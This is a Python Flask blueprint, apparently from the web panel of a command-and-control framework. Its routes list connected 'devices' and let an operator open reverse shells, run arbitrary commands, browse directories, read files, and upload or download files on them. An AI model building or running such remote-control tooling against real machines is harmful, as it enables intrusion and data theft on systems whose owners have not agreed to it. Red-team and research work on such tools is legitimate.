from flask import (
    Blueprint,
    render_template,
    jsonify,
    flash,
    redirect,
    send_file,
    request)
from Utils.web import generate_response
from Database import db_session, DeviceModel
from Web.Endpoints.authorization import authorized, admin
from Server.server_class import ServerClass


def devices_bp(server: ServerClass):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @authorized
    def get_devices_index():
        use_json = request.args.get("json", "").lower() == "true"
        devices: list[DeviceModel | None] = db_session.query(DeviceModel).all()
        if use_json:
            return jsonify([device.to_json(server) for device in devices])
        return render_template("devices/index.html", devices=devices)

    @devices_bp.route("/reverse_shell", methods=["POST"])
    @authorized
    def post_reverse_shell():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.form.get("id")
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            server.get_active_handler(id).reverse_shell(address, port)
        except Exception as e:
            return generate_response(use_json, "error", "Couldn't open a Reverse Shell.", "listeners", 500)
        else:
            return generate_response(use_json, "success", "Reverse Shell opened.", "listeners")

    @devices_bp.route("/rce", methods=["POST"])
    @authorized
    def post_rce():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.form.get("id")
        cmd = request.form.get("cmd")

        if not id.isdigit():
            return generate_response(use_json, "error", "Invalid ID.", "devices", 400)
        id = int(id)

        try:
            output = server.get_active_handler(id).rce(cmd)
        except Exception as e:
            return generate_response(use_json, "error", str(e), "listeners", 500)
        else:
            return generate_response(use_json, "success", output, "listeners")

    @devices_bp.route("/infos", methods=["GET"])
    @authorized
    def get_infos():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.args.get("id", "")

        if not id.isdigit():
            return generate_response(use_json, "error", "Invalid ID.", "devices", 400)
        id = int(id)

        output = server.get_active_handler(id).infos()
        try:
            output = server.get_active_handler(id).infos()
        except Exception as e:
            return generate_response(use_json, "error", str(e), "listeners", 500)
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/dir", methods=["GET"])
    @authorized
    def get_dir():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.args.get("id", "")
        dir = request.args.get("dir")

        if not id.isdigit():
            return generate_response(use_json, "error", "Invalid ID.", "devices", 400)
        id = int(id)
        try:
            output = server.get_active_handler(id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/file-contents", methods=["GET"])
    @authorized
    def get_file_contents():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.args.get("id", "")
        path = request.args.get("path")
        if not id.isdigit():
            return generate_response(use_json, "error", "Invalid ID.", "devices", 400)
        id = int(id)
        if path is None:
            return generate_response(use_json, "error", "File path is missing.", "devices", 400)
        try:
            output = server.get_active_handler(int(id)).get_file_contents(path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/upload", methods=["POST"])
    @authorized
    def post_upload():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.form.get("id")
        remote_path = request.form.get("remote_path")
        if not id.isdigit():
            return generate_response(use_json, "error", "Invalid ID.", "devices", 400)
        id = int(id)
        # check if file is in request
        if not "file" in request.files:
            return generate_response(use_json, "error", "The as_file parameter is true, but no file was given.", "devices", 400)
        if remote_path is None:
            return generate_response(use_json, "error", "Upload path is missing.", "devices", 400)
        try:
            output = server.get_active_handler(
                id).file_upload(request.files.get('file'), remote_path)
        except Exception as e:
            return generate_response(use_json, "error", str(e), "devices", 500)
        else:
            return generate_response(use_json, "success", output, "devices")

    @devices_bp.route("/download", methods=["GET"])
    @authorized
    def get_download():
        use_json = request.args.get("json", "").lower() == "true"
        id = request.args.get("id", "")
        remote_path = request.args.get("path")
        if not id.isdigit():
            return generate_response(use_json, "error", "Invalid ID.", "devices", 400)
        id = int(id)
        if remote_path is None:
            return generate_response(use_json, "error", "File path is missing.", "devices", 400)
        try:
            file = server.get_active_handler(id).file_download(remote_path)
        except Exception as e:
            return generate_response(use_json, "error", str(e), "/devices", 500)
        else:
            return send_file(file)
    return devices_bp
